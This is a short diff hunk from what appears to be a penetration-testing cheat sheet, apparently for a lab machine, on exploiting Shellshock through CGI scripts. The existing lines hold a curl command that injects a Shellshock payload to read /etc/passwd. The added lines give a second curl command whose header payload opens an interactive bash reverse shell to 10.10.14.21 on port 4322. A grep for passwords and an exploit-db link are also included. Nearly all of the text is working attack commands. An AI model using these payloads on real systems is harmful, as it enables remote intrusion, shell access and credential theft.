@@ -22,6 +22,8 @@ grep -ir 'password'
 # shellshock with cgi 
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
 http://localhost:8080/cgi-bin/vulnerable
+or reversershell 
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.21/4322 0>&1" http://10.10.10.56:80/cgi-bin/user.sh
 # reverse shell with shellshock
 https://exploit-db.com/exploits/34900/
 #find cgi vulnerable 
